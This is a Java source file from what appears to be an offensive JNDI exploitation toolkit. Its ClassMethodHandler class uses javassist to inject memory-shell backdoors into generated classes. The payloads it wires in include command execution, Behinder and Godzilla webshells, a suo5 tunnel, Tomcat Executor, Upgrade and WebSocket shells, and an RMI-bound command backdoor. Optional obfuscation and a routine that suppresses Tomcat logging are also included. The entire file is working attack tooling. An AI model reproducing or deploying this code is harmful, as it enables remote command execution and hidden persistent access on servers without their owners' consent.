package com.qi4l.jndi.gadgets.utils.handle;

import com.qi4l.jndi.gadgets.Config.Config;
import com.qi4l.jndi.gadgets.Config.MemShellPayloads;
import com.qi4l.jndi.gadgets.utils.Utils;
import javassist.CtClass;
import javassist.CtMethod;
import javassist.NotFoundException;
import org.apache.commons.lang.StringUtils;

import java.util.ArrayList;
import java.util.Arrays;
import java.util.List;

import static com.qi4l.jndi.gadgets.utils.handle.ClassFieldHandler.converString;
import static com.qi4l.jndi.gadgets.utils.handle.ClassFieldHandler.insertField;

public class ClassMethodHandler {
    /**
     * 向指定的 ctClass 中插入方法，使用 insertBefore，不影响原有逻辑
     *
     * @param ctClass 目标 CtClass
     * @param method  方法名
     * @param payload 方法内容 String
     * @throws Exception 抛出异常
     */
    public static void insertMethod(CtClass ctClass, String method, String payload) throws Exception {
        //System.out.println(ctClass);
        //System.out.println(method);
        //System.out.println(payload);
        CtMethod cm = ctClass.getDeclaredMethod(method);
        cm.insertBefore(payload);
    }


    public static void insertKeyMethodByClassName(CtClass ctClass, String className, String type) throws Exception {

        // 动态为 Echo回显类 添加执行命令功能
        if (className.endsWith("Echo")) {
            insertCMD(ctClass);
            ctClass.getDeclaredMethod("q").setBody("{return execCmd($1);}");
            return;
        }

        // 如果是 RMI 内存马，则修改其中的 registryPort、bindPort、serviceName，插入关键方法
        if (className.contains("RMIBindTemplate")) {
            String[] parts = type.split("-");

            if (parts.length < 3) {
                // BindPort 写 0 就是随机端口
                throw new IllegalArgumentException("Command format is: EX-MS-RMIBindTemplate-<RegistryPort>-<BindPort>-<ServiceName>");
            }

            // 插入关键参数
            String rPortString = "port=" + parts[0] + ";";
            ctClass.makeClassInitializer().insertBefore(rPortString);
            String bPort = "bindPort=" + parts[1] + ";";
            ctClass.makeClassInitializer().insertBefore(bPort);
            String sName = "serviceName=\"" + parts[2] + "\";";
            ctClass.makeClassInitializer().insertBefore(sName);
            ctClass.setInterfaces(new CtClass[]{Config.POOL.get("javax.management.remote.rmi.RMIConnection"), Config.POOL.get("java.io.Serializable")});

            // 插入目标执行类
            insertCMD(ctClass);
            ctClass.addMethod(CtMethod.make("public String getDefaultDomain(javax.security.auth.Subject subject) throws java.io.IOException {return new String(execCmd(((java.security.Principal)subject.getPrincipals().iterator().next()).getName()).toByteArray());}", ctClass));
            return;
        }

        // 获取每个不同的类对应要插入的方法名
        String method = getMethodName(ctClass);

        // WebSocket 内存马
        if (className.contains("TWSMSFromThread")) {
            insertCMD(ctClass);
            insertMethod(ctClass, method, Utils.base64Decode(MemShellPayloads.WS_SHELL));
            return;
        }

        // Tomcat Upgrade 内存马
        if (className.contains("TUGMSFromJMX")) {
            insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = " + converString(Config.CMD_HEADER_STRING) + ";");
            insertGetFieldValue(ctClass);
            insertCMD(ctClass);
            insertMethod(ctClass, method, Utils.base64Decode(MemShellPayloads.UPGRADE_SHELL));
            return;
        }

        // Tomcat Executor 内存马
        if (className.contains("TEXMSFromThread")) {
            insertField(ctClass, "TAG", "public static String TAG = \"" + Config.CMD_HEADER_STRING + "\";");
            insertCMD(ctClass);
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.GET_REQUEST), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.BASE64_ENCODE_BYTE_TO_STRING), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.GET_RESPONSE), ctClass));
            insertMethod(ctClass, method, Utils.base64Decode(MemShellPayloads.EXECUTOR_SHELL));
            return;
        }

        // 其他的进入下一段处理逻辑
        if (StringUtils.isNotEmpty(type)) {
            insertKeyMethod(ctClass, type, method);
        }
    }


    public static void insertKeyMethod(CtClass ctClass, String type, String method) throws Exception {
        // 判断是否为 Tomcat 类型，需要对 request 封装使用额外的 payload
        String name = ctClass.getName();
        name = name.substring(name.lastIndexOf(".") + 1);

        // 大多数 SpringBoot 项目使用内置 Tomcat
        boolean isTomcat  = name.startsWith("T") || name.startsWith("Spring");
        boolean isWebflux = name.contains("Webflux");

        // 命令执行、各种内存马
        insertField(ctClass, "HEADER_KEY", "public static String HEADER_KEY=" + converString(Config.HEADER_KEY) + ";");
        insertField(ctClass, "HEADER_VALUE", "public static String HEADER_VALUE=" + converString(Config.HEADER_VALUE) + ";");

        if ("bx".equals(type)) {
            insertBase64Decode(ctClass);
            insertGetFieldValue(ctClass);
            insertGetMethodAndInvoke(ctClass);

            if (Config.IS_OBSCURE) {
                insertGetUnsafe(ctClass);
            }

            String shell = "";
            if (isTomcat) {
                insertTomcatNoLog(ctClass);
                shell = Config.IS_OBSCURE ? MemShellPayloads.BEHINDER_SHELL_FOR_TOMCAT_OBSCURE : MemShellPayloads.BEHINDER_SHELL_FOR_TOMCAT;
            } else {
                shell = Config.IS_OBSCURE ? MemShellPayloads.BEHINDER_SHELL_OBSCURE : MemShellPayloads.BEHINDER_SHELL;
            }

            insertMethod(ctClass, method, Utils.base64Decode(shell).replace("f359740bd1cda994", Config.PASSWORD));
        } else if ("gz".equals(type)) {
            insertField(ctClass, "payload", "Class payload ;");
            insertField(ctClass, "xc", "String xc = " + converString(Config.GODZILLA_KEY) + ";");
            insertField(ctClass, "PASS", "String PASS = " + converString(Config.PASSWORD_ORI) + ";");

            insertBase64Decode(ctClass);
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.BASE64_ENCODE_BYTE_TO_STRING), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.MD5), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.AES_FOR_GODZILLA), ctClass));
            insertTomcatNoLog(ctClass);
            if (isWebflux) {
                insertMethod(ctClass, method, Utils.base64Decode(MemShellPayloads.GODZILLA_SHELL_FOR_WEBFLUX));
            } else {
                insertMethod(ctClass, method, Utils.base64Decode(MemShellPayloads.GODZILLA_SHELL));
            }
        } else if ("gzraw".equals(type)) {
            insertField(ctClass, "payload", "Class payload ;");
            insertField(ctClass, "xc", "String xc = " + converString(Config.GODZILLA_KEY) + ";");

            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.AES_FOR_GODZILLA), ctClass));
            insertTomcatNoLog(ctClass);
            insertMethod(ctClass, method, Utils.base64Decode(MemShellPayloads.GODZILLA_RAW_SHELL));
        } else if ("suo5".equals(type)) {

            // 先写入一些需要的基础属性
            insertField(ctClass, "gInStream", "java.io.InputStream gInStream;");
            insertField(ctClass, "gOutStream", "java.io.OutputStream gOutStream;");

            // 依次写入方法
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.SUO5.SUO5_NEW_CREATE), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.SUO5.SUO5_NEW_DATA), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.SUO5.SUO5_NEW_DEL), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.SUO5.SUO5_SET_STREAM), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.SUO5.SUO5_NEW_STATUS), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.SUO5.SUO5_U32_TO_BYTES), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.SUO5.SUO5_BYTES_TO_U32), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.SUO5.SUO5_MARSHAL), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.SUO5.SUO5_UNMARSHAL), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.SUO5.SUO5_READ_SOCKET), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.SUO5.SUO5_READ_INPUT_STREAM_WITH_TIMEOUT), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.SUO5.SUO5_TRY_FULL_DUPLEX), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.SUO5.SUO5_READ_REQ), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.SUO5.SUO5_PROCESS_DATA_UNARY), ctClass));
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.SUO5.SUO5_PROCESS_DATA_BIO), ctClass));

            // 为恶意类设置 Runnable 接口以及 RUN 方法
            CtClass runnableClass = Config.POOL.get("java.lang.Runnable");
            ctClass.addInterface(runnableClass);
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.SUO5.RUN), ctClass));

            // 插入关键方法
            insertMethod(ctClass, method, Utils.base64Decode(MemShellPayloads.SUO5.SUO5));
        } else {
            insertCMD(ctClass);
            insertField(ctClass, "CMD_HEADER", "public static String CMD_HEADER = " + converString(Config.CMD_HEADER_STRING) + ";");

            if (isWebflux) {
                insertMethod(ctClass, method, Utils.base64Decode(MemShellPayloads.CMD_SHELL_FOR_WEBFLUX));
            } else if (isTomcat) {
                insertTomcatNoLog(ctClass);
                insertMethod(ctClass, method, Utils.base64Decode(MemShellPayloads.CMD_SHELL_FOR_TOMCAT));
            } else {
                insertGetMethodAndInvoke(ctClass);
                insertMethod(ctClass, method, Utils.base64Decode(MemShellPayloads.CMD_SHELL));
            }
        }
    }

    /**
     * 向指定类中写入命令执行方法 execCmd
     * 方法需要 toCString getMethodByClass getMethodAndInvoke getFieldValue 依赖方法
     *
     * @param ctClass 指定类
     * @throws Exception 抛出异常
     */
    public static void insertCMD(CtClass ctClass) throws Exception {
        if (Config.IS_OBSCURE) {
            insertGetUnsafe(ctClass);
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.TO_CSTRING_Method), ctClass));
            insertGetMethodAndInvoke(ctClass);
            insertGetFieldValue(ctClass);
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.EXEC_CMD_OBSCURE), ctClass));
        } else {
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.EXEC_CMD), ctClass));
        }
    }

    public static void insertBase64Decode(CtClass ctClass) throws Exception {
        try {
            ctClass.getDeclaredMethod("base64Decode");
        } catch (NotFoundException e) {
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.BASE64_DECODE_STRING_TO_BYTE), ctClass));
        }
    }

    public static void insertGetFieldValue(CtClass ctClass) throws Exception {
        try {
            ctClass.getDeclaredMethod("getFieldValue");
        } catch (NotFoundException e) {
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.GET_FIELD_VALUE), ctClass));
        }
    }

    public static void insertGetUnsafe(CtClass ctClass) throws Exception {
        try {
            ctClass.getDeclaredMethod("getUnsafe");
        } catch (NotFoundException e) {
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.GET_UNSAFE), ctClass));
        }
    }


    public static void insertGetMethodAndInvoke(CtClass ctClass) throws Exception {
        try {
            ctClass.getDeclaredMethod("getMethodByClass");
        } catch (NotFoundException e) {
            ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.GET_METHOD_BY_CLASS), ctClass));
        }

        try {
            ctClass.getDeclaredMethod("getMethodAndInvoke");
        } catch (NotFoundException e) {
            if (Config.IS_OBSCURE) {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.GET_METHOD_AND_INVOKE_OBSCURE), ctClass));
            } else {
                ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.GET_METHOD_AND_INVOKE), ctClass));
            }
        }
    }

    public static void insertTomcatNoLog(CtClass ctClass) throws Exception {
        insertGetFieldValue(ctClass);
        insertGetMethodAndInvoke(ctClass);
        ctClass.addMethod(CtMethod.make(Utils.base64Decode(MemShellPayloads.TOMCAT_NO_LOG), ctClass));
    }

    /**
     * 获取该类的关键方法
     *
     * @param ctClass CtClass
     * @return 返回方法名
     * @throws Exception 抛出异常
     */
    public static String getMethodName(CtClass ctClass) throws Exception {
        List<CtClass> classes = new java.util.ArrayList<CtClass>(Arrays.asList(ctClass.getInterfaces()));
        String        name    = ctClass.getName();
        String        method  = "";
        classes.add(ctClass.getSuperclass());

        for (CtClass value : classes) {
            String className = value.getName();
            if (Config.KEY_METHOD_MAP.containsKey(className)) {
                method = Config.KEY_METHOD_MAP.get(className);
                break;
            }
        }

        if (name.contains("SpringControllerMS")) {
            method = "drop";
        } else if (name.contains("Struts2ActionMS")) {
            method = "executeAction";
        }
        return method;
    }

    public static void insertInitHookClassINFORMATION(CtClass ctClass, ArrayList<String> list) throws Exception {
        insertMethod(ctClass, "initHookClassINFORMATION", "{HOOK_CLASS_INFORMATION_MAP.add(\"" + list.get(0) + "\");HOOK_CLASS_INFORMATION_MAP.add(\"" + list.get(1) + "\");HOOK_CLASS_INFORMATION_MAP.add(\"" + list.get(2) + "\");}");
    }
}
